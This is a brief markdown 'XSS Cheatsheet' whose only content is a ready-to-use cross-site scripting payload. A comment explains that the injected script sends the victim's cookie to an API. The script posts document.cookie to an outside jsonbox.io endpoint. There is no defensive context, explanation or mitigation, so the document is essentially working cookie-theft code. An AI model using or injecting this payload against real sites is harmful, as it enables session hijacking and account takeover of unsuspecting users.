# XSS Cheatsheet

```js
// Running this code when a XSS attack is feasible will send the cookie to an API

<script>
fetch('https://jsonbox.io/box_fd90d69348aabf9a9383', {
  headers: { "Content-Type": "application/json; charset=utf-8" },
  method: 'POST',
  body: JSON.stringify({ cookie: document.cookie })
})
.then(response => response.json())
.then(data => console.log(data))
</script>
```
